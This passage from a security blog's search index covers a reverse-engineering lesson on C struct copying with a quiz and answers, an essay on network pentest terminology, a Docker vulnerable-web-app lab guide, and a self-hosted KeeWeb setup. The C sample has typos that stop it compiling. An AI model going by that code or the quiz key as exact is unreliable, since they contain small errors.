but instead different from each other. The values are stored in different addresses, even though they are the same value.</p>"},{"location":"RE101/3.%20Simple%20Lambdas/#track3_3c","title":"Track3_3.c","text":"<pre><code>struct SimpleContext{\n   int Arg1;\n   int Arg2;\n};\nstruct SimpleLambda{\n   void *pCallback;\n   short Priority;\n   struct SimpleContext *pContext\n};\n\nint SimpleCallback(struct SimpleContext *Context){\n   Context-&gt;Arg1 = 14;\n   return 0;\n}\n\nint main(){\n   struct SimpleContext c;\n   c.Arg1 = 10;\n   c.Arg2 = 12;\n   struct SimpleLambda l;\n\n   l.pCallback = SimpleCallback;\n   l.Priority = 1;\n   l.pContext = &amp;c;\n   struct SimpleLambda l2 = l;\n\n   printf(\"new lambda priority val: %d and address: 0x%x\\n\", l2.Priority, &amp;l2.priority);\n   printf(\"old lambda priority val: %d and address: 0x%x\\n\", l.Priority, &amp;l.priority);\n\n   printf(\"new lambda context address: 0x%x\\n\", l2.pContext);\n   printf(\"old lambda context address: 0x%x\\n\", l.pContext);\n\n   l2.pContext = malloc(sizeof(struct SimpleContext));\n   memcpy(l2.pContext,l.pContext,sizeof(struct SimpleContext));\n\n   printf(\"new lambda context address: 0x%x\\n\", l2.pContext);\n   printf(\"old lambda context address: 0x%x\\n\", l.pContext);\n   printf(\"new lambda context arg1: %d\\n\", l2.pContext-&gt;Arg1);\n}\n</code></pre>"},{"location":"RE101/3.%20Simple%20Lambdas/#track3_3exe","title":"Track3_3.exe","text":"<p>Below is the function renamed initially, with the knowledge we gained till track3_2. Shallow Copy </p> <p>As can be seen before <code>rep movsb</code>, the function looks exactly, like what is happening at the source code. Another thing we can notice here, when renaming are instructions :  <pre><code>mov rdi, rax\nmov rsi, rcx\nrep movsb\n</code></pre> Where, <code>rdi</code> is the destination index and <code>rsi</code>, source index. Before <code>rep movsb</code> which means copying of bytes repeatedly from source to destination is executed.</p> <p>We trace the register <code>rcx</code> since the value in it is moved into <code>rsi</code> and we see above that the address of <code>simpleLambda</code> is loaded into <code>rcx</code> which is then loaded into <code>rsi</code>. </p> <p><code>rdi</code> is loaded from <code>rax</code> which is loaded from <code>var_F8</code> and <code>0x18</code> (hex) is moved into <code>ecx</code> before <code>rep movsb</code> is executed. From here it seems like <code>ecx</code> is being used as a counter. The above operation is the copying of values in <code>simpleLambda l</code> to <code>simpleLambda l2</code>. </p> <p>Therefore, we can deduce that <code>var_F8</code> is the address for the new lambda.</p> <p>Deep Copy In deep copy below,  </p> <p>The disassembly below is a nicer representation after the renaming and also going to the stack and giving <code>l2</code> the <code>simpleLambda</code> structure.</p> <p>Shallow Copy </p> <p>Deep Copy </p>"},{"location":"RE101/3.%20Simple%20Lambdas/#quiz_2","title":"Quiz","text":"<p>Q1. Inside the binary find the copying of a SimpleLambda structure. How many bytes will be taken to the new structure? </p> <p>Ans : 24</p> <p>Q2. Would such a default way of C copying pose some possible problems to us? </p> <p>Ans : Yes, the value fields would be good, but all the pointer fields would still reference the same memory addresses. So in this case changing would affect both structures - original and copied one</p> <p>Q3. Please locate in the resulting executable the malloc() call you added for deep copying. How many bytes does it allocate for SimpleContext and why?</p> <p>Ans : 8 bytes, you provided sizeof(struct SimpleContext) as argument and SimpleContext contains just 2 fields 4 bytes each</p>"},{"location":"Random_Thoughts/010622-1824/","title":"Network Pentest or... not?","text":""},{"location":"Random_Thoughts/010622-1824/#what-network-pentest-usually-refers-to","title":"What Network Pentest usually refers to...","text":"<p>Oftentimes when I think of the term network pentest, the thing that comes to my mind would be an OSCP AD environment, eCPPT or even eCPTX kind of pentest where it is usually a vulnerable HTTP application, misconfigured FTP service, running some exploit to get a shell and then lateral move from there.</p> <p>A simple google search also seems to suggest that what is described above is considered as Network Pentest - 1, 2</p>"},{"location":"Random_Thoughts/010622-1824/#osi-layer","title":"OSI layer","text":"<p>Below is a picture of OSI layer.  As we can see from above things we mention like FTP, HTTP and the services involved all involves the Application Layer rather than the Network Layer and the nature of the exploit as mentioned above seems to be targeting the Application and rather than the Network equipments.</p>"},{"location":"Random_Thoughts/010622-1824/#network-layer-layer-3-pentest","title":"Network Layer (Layer 3) Pentest","text":""},{"location":"Random_Thoughts/010622-1824/#which-of-these-are-considered-layer-3-pentest","title":"Which of these are considered Layer 3 Pentest?","text":"<p>As can be referenced from the links below, we can see that there are instances where an attack on router a Layer 3 device. 3,4,5 The attacks in the  scenarios within the post is However could Layer 3 Pentest also mean these too? 6,7,8</p> <p>From the above posts, we can see that the despite the similarity in framework(MITRE), and even though the device attacked is the same, the skillsets required to conduct both types of pentest are different. One is the exploitation of software while the other is the exploitation of the protocol used to communicate. Thus the former would require an extensive knowledge of software exploitations while the other would require an extensive knowledge of routing protocols as well as inter-device communication protocols. </p>"},{"location":"Random_Thoughts/010622-1824/#granular-and-precise-term","title":"Granular and Precise Term","text":"<p>Therefore I think a more precise term of Pentest should be coined rather than Network Pentest as the network based on the OSI model can include the Application Layer, the Transport Layer, the Network Layer, Data Link Layer and even the Physical Layer.</p>"},{"location":"Random_Thoughts/010622-1824/#afterthought","title":"Afterthought","text":"<p>It is likely during the scoping phase of a pentest that the the extent of a network pentest is discussed however, from scouring the web pages of services provided looking at trainings provided, Network Pentest seems to suggest  pentest of Layer 5 Services and Layer 4 and Layer 3 Protocols seems to not be mentioned alot...</p> <p>After all this is also a pentest but the scope of this test is way bigger. Just thought that perhaps, we can give a more granular and precise name to the kind of network pentest conducted like how we differentiated Web Application Pentest from Cloud Pentest due to the niche skillsets involved in conducting the pentest... </p>"},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/","title":"Building a Personal Containerized Web Pentest Lab","text":""},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/#problems-to-solve","title":"Problems to Solve","text":"<p>When learning Web Pentest, we often would need some variety of \"boxes\" to play around with. However, it is always dreaded when it comes to building our own playground. Most of the time the reasons will be resource issues (VMs are resource intensive), lack of resource/dependency isolation (similar to python dependency issues) if we were to try to set up multiple web applications within the same server VM as well as long set up time.  </p>"},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/#containers-to-the-rescue","title":"Containers to The Rescue","text":"<p>Hence we set out to use containers specifically Docker to solve the three problems stated above : resource intensive, lack of resource/dependency isolation as well as long set-up time.</p>"},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/#benefits-of-containerized-lab","title":"Benefits of Containerized Lab","text":"<p>We do not need to research too much to know the benefits of containerization. This journal neatly sums up what Docker is and its usefulness for school labs. </p> <p>\"Docker can quickly build and deploy applications, as well as build a highly flexible distributed system, making full use of hardware resources to reduce corresponding costs\" </p> <p>Whilst a distributed system is not relevant for our use case, a highly flexible system, making full use of hardware resources is what we are looking for. In addition to that this blog illustrates what a dependency problem is and how docker can be used to solve the problem.</p> <p>Imagine you had two applications. Both have various third-party libraries they depend upon. However, both share a common dependency. The problem? They depend on different versions of the same library!</p> <p>The idea is to put your application and its dependencies inside of an encapsulated container. This way, you isolate the application from other applications on your host system... ...</p> <p>Therefore we know that Docker is the solution to our problem.</p>"},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/#ready-made-containers-for-learning-web-pentest","title":"Ready-made Containers for Learning Web Pentest","text":"<p>There are many \"ready-made\" containers for vulnerable web applications that has been published online and one reliable source we can get these containers from is OWASP. The place to get these ready made containers is in the Vulnerable Web Applications Directory and to further simplify our search, we simply go to the \"Containerized\" tab. </p>"},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/#personal-implementation-of-docker-based-web-pentest-lab","title":"Personal Implementation of Docker-based Web Pentest Lab","text":"<p>My personal implementation of Docker-based Web Pentest Lab is simply an Ubuntu Server VM that has Docker installed and a Kali VM that will act as the attacker machine. </p> <p>The network connection of the VMs are set to NAT so that they are within the same subnet, have internet access but not directly connected to the router like in \"bridge\" mode.</p>"},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/#basic-docker-commands","title":"Basic Docker Commands","text":"<p>Below are some basic docker commands to get started in managing our docker instances.</p> <ul> <li> <p><code>docker pull</code> is used to pull the image from Docker Hub. <pre><code>docker pull &lt;userid/image name&gt;\n</code></pre></p> </li> <li> <p><code>docker image</code> / <code>docker images</code> is used to list images that are in the host. <pre><code>docker image list\ndocker images\n</code></pre></p> </li> <li> <p><code>docker run</code> is used to run the image that has been pulled. <pre><code>docker run --name &lt;container name&gt; -itd --rm -p &lt;ip address&gt;:&lt;host port&gt;:&lt;container port&gt;\n</code></pre></p> </li> <li> <p><code>docker exec</code> is used to execute commands inside the docker container without being in the container. The second command below is to execute <code>/bin/bash</code> to get a shell of the docker container.  <pre><code>docker exec &lt;container name/container id&gt; &lt;commands&gt;\ndocker exec -it &lt;container name/container id&gt; /bin/bash\n</code></pre></p> </li> <li> <p><code>docker ps</code> is used to list containers that are running <pre><code>docker ps\n</code></pre></p> </li> <li> <p><code>docker commit</code> is used to save the state of docker container that is running. <pre><code>docker commit &lt;container name&gt; &lt;user id&gt;/&lt;image name&gt;:&lt;tag&gt;\n</code></pre></p> </li> <li> <p><code>docker kill</code> is used to destroy a running container <pre><code>docker kill &lt;container name/container id&gt;\n</code></pre></p> </li> </ul>"},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/#example-deploying-generic-university","title":"Example : Deploying Generic University","text":"<p>Generic University is a Web Application Pentest Lab developed by <code>InsiderPhD</code> and <code>busk3r</code> turned it into a container. The docker version of Generic University is found here with some set-up instructions. In general the commands used are similar to what was given above, just with some extra tweaks due to the way this image is developed.</p> <p>Firstly, we do a <code>docker pull</code> to pull the container image from docker hub.</p> <p></p> <p>We then do a <code>docker image list</code> to list the images that exist within our host.</p> <p></p> <p>Secondly, we do a <code>docker run</code> to start up the container.</p> <p></p> <p>Lastly, to complete the set up we do a <code>docker exec</code> to start the relevant services (mysql and php) that are used in the web application.</p> <p></p> <p> </p> <p>As can be seen above, server logs are generated when we visit the webpage. </p> <p>We can save the state of the container by doing a <code>docker commit</code> like below.</p> <p></p> <p>Then, we can simply destroy the container using <code>docker kill</code>.</p> <p></p> <p>The docker with the saved state can be run with the following command <pre><code>docker run --name &lt;image name&gt;:&lt;tag name&gt; -itd --rm -p &lt;ip address&gt;:&lt;host port&gt;:&lt;container port&gt; \n</code></pre></p> <p>As can be seen below, when we run a new docker. Apart from restarting php and mysql service, the last actions like changes to SQL database are saved.</p> <p></p> <p>With this example, we can see that it is very easy to set up a vulnerable web application and save the state so that we can continue from where we left off with docker.</p>"},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/#conclusion","title":"Conclusion","text":"<p>Docker is a really convenient means to help deploy a vulnerable web application in an efficient and \"clean\" manner. It also abstracts the infrastructure side of things away so that we can focus on the testing of web application rather than worry about setting the web application up correctly.</p>"},{"location":"Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/#afterthought","title":"Afterthought","text":"<p>This exercise is can also a good primer for us to familiarise ourselves with Docker. More can be done to learn more about Docker and web applications that relies on Docker like building a reverse proxy baremetal and hiding the containers behind that reverse proxy. A step further would then be to build a reverse proxy container with apache or nginx and channeling traffic through the reverse proxy container.  </p> <p>Learning Docker is important as cloud-based web applications are becoming commonplace and the infrastructure of cloud-based web applications are moving away from the traditional web server structure and more to a containerized structure. </p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/","title":"Password Management with Self-Hosted KeeWeb","text":""},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#introduction","title":"Introduction","text":"<p>The motivation to create a self-hosted password management system is succintly summarized by this post. </p> <p>Apart from the incident mentioned in the post above, there has also been breaches that happened after and recently too. Even though, in the current incident LastPass claimed that users are not affected, the risk is real. This begs the question - how much can we trust these password management service providers? </p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#_1","title":"\u30d1\u30b9\u30ef\u30fc\u30c9\u7ba1\u7406\u30bd\u30d5\u30c8\u304c\u5fc5\u8981\u3060","text":"<p>WEB\u30b5\u30fc\u30d3\u30b9\u5168\u76db\u306e\u6628\u4eca\u3001\u30d1\u30b9\u30ef\u30fc\u30c9\u306e\u7ba1\u7406\u306f\u975e\u5e38\u306b\u3084\u3063\u304b\u3044\u306a\u554f\u984c\u3068\u306a\u3063\u3066\u3044\u307e\u3059\u3002\u4e00\u4eba\u3067\uff11\uff10\uff10\u3082\uff12\uff10\uff10\u3082\u30a2\u30ab\u30a6\u30f3\u30c8\u3092\u6301\u3064\u3068\u3001\u3082\u306f\u3084\u8a18\u61b6\u306b\u983c\u3063\u305f\u7ba1\u7406\u306f\u30d1\u30b9\u30ef\u30fc\u30c9\u4f7f\u3044\u56de\u3057\u3092\u62db\u304d\u3001\u9006\u306b\u5371\u967a\u306a\u72b6\u6cc1\u306b\u306a\u3063\u3066\u304d\u307e\u3057\u305f\u3002  </p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#_2","title":"\u30d1\u30b9\u30ef\u30fc\u30c9\u7ba1\u7406\u30b5\u30fc\u30d3\u30b9\u3068\u304b\u306f\u6016\u3044","text":"<p>\u304b\u3068\u3044\u3063\u3066\u3001\u30af\u30e9\u30a6\u30c9\u578b\u30d1\u30b9\u30ef\u30fc\u30c9\u30de\u30cd\u30fc\u30b8\u30e3\u3092\u4f7f\u3046\u3068\u3001\u30cf\u30c3\u30ad\u30f3\u30b0\u3092\u53d7\u3051\u305f\u3068\u304d\u306b\u5fc3\u914d\u3067\u3059\u3002cf. \u30d1\u30b9\u30ef\u30fc\u30c9\u4e00\u5143\u7ba1\u7406\u306eLastPass\u306b\u30cf\u30c3\u30ad\u30f3\u30b0\u3001\u60c5\u5831\u6d41\u51fa\u3082 \u3053\u306e\u624b\u306e\u30b5\u30fc\u30d3\u30b9\u306f\u3001\u4f7f\u3044\u52dd\u624b\u304c\u5411\u4e0a\u3057\u5229\u7528\u30e6\u30fc\u30b6\u304c\u5897\u3048\u308c\u3070\u5897\u3048\u308b\u307b\u3069\u3001\u30cf\u30c3\u30ad\u30f3\u30b0\u306e\u30bf\u30fc\u30b2\u30c3\u30c8\u306b\u306a\u308a\u3084\u3059\u3044\u3068\u3044\u3046\u3001\u30b8\u30ec\u30f3\u30de\u3082\u3042\u308a\u307e\u3059\u3002</p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#the-need-for-password-manager","title":"The need for Password Manager","text":"<p>With the proliferation of web services, password management has become a hassle. When one person has 100 or 200 accounts, (password) management that relies on memorization leads to password reuse, which is a dangerous situation.</p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#password-management-service-is-scary","title":"Password Management Service is Scary","text":"<p>On the other hand, if you use a cloud-based password manager, you will be worried about being hacked. This type of service also presents a dilemma: the more user-friendly it becomes and the larger the user base, the more likely it is to become a target for hacking.</p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#keeweb-to-the-rescue","title":"KeeWeb to the rescue","text":"<p>The implmentation suggested by the Japanese post uses passbolt on a lightsail instance which I have attempted to implement but as I do not want to own a domain (LetsEncrypt requirement) and have no ready SMTP server the usefulness is limited and this limitation applies to other self-hosted web based password management like Bitwarden and PadLoc. </p> <p>Hence the idea switched to using Keepass an actively maintained open source password manager stored locally. The only problem with Keepass is that it is stored locally and requires the installation of a desktop application (Windows) to open. The Keepass website though, offers a glimmer of hope in it's 'Contributed/Unofficial KeePass Ports' section. </p> <p></p> <p>From the above, we can see that there is a myriad of ports and the one that satisfies my requirements is KeeWeb. KeePass4Web is not considered as it is not as actively maintained and used as compared to KeeWeb.</p> <p>Below is the intended architecture when building the KeeWeb service. KeeWeb will be a Lightsail instance running within a Virtual Network and we can only access it through VPN - this is to keep the attack surface to the minimum.  </p> <p></p> <p>As KeeWeb is merely a processing tool, it does not store the password vault and we would need to make use of Google Drive or OneDrive as Storage for the vault file.</p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#deploying-on-lightsail","title":"Deploying On Lightsail","text":""},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#create-instance","title":"Create Instance","text":"<p>We login to the AWS console and navigate to the Lightsail Console and we choose \"Create Instance\"</p> <p></p> <p>In the next page, we choose Linux/Unix as the platform and OS Only - Ubuntu 20.04 LTS.</p> <p></p> <p>Then we choose our plan, in this case, the cheapest plan should suffice as this is only for personal use. Then we click on the last \"Create Instance\" button at the bottom.</p> <p></p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#configure-firewall-rules","title":"Configure Firewall Rules","text":"<p>We then choose \"Manage\" </p> <p>In the \"networking\" tab we set the IPv4 Firewall rules to only allow connection from IP address of VPN host.</p> <p></p> <p>Disable IPv6 networking.</p> <p></p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#disable-root-user-and-add-sudo-password","title":"Disable root user and add sudo password","text":"<p>Connect to the instance using SSH via browser. (Saves the hassle of setting up public and private key.)   Change sudo password <pre><code>sudo su \npasswd\n#follow the instructions to change password\n</code></pre> Disable root login <pre><code>sudo nano /etc/passwd\n#edit the root line to the following\n#root:x:0:0:root:/root:/usr/sbin/nologin\n</code></pre></p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#update-and-install-dependencies","title":"Update and Install Dependencies","text":"<pre><code>sudo apt update\nsudo apt upgrade\nsudo apt install docker.io\n</code></pre>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#generate-self-signed-cert","title":"Generate Self-signed Cert","text":"<p>Following the post created by the author of KeeWeb we download the bash script he has written. <pre><code>wget https://raw.githubusercontent.com/antelle/generate-ip-cert/master/generate-ip-cert.sh\n\nchmod +x generate-ip-cert.sh\n\n./generate-ip-cert.sh &lt;ip address&gt;\n</code></pre> Make an <code>/etc/nginx/external</code> directory and copy the generated key files into the directory. <pre><code>sudo mkdir -p /etc/nginx/external &amp;&amp; mv *pem /etc/nginx/external\nsudo cp *.pem /etc/nginx/external \n</code></pre></p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#installing-keeweb","title":"Installing KeeWeb","text":"<p>Pull the KeeWeb Docker image. <pre><code>docker pull antelle/keeweb\n</code></pre> Run the docker image. <pre><code>docker run --name keeweb -d -p 443:443 -p 80:80 -v $EXT_DIR:/etc/nginx/external/ antelle/keeweb\n</code></pre></p> <p>As can be seen below, we have created an HTTPS connection albeit it is not a \"valid\" certificate.</p> <p> We now can use KeeWeb normally! </p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#snapshot-working-instance","title":"Snapshot Working Instance","text":"<p>We create a working snapshot of the instance as backup. </p>"},{"location":"Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/#conclusion","title":"Conclusion","text":"<p>KeeWeb might not be the most elegant solution for password management (as evident from the network diagram) but it at least is a step away from SaaS solutions - where we have to trust a third party to secure our passwords.</p>"}]}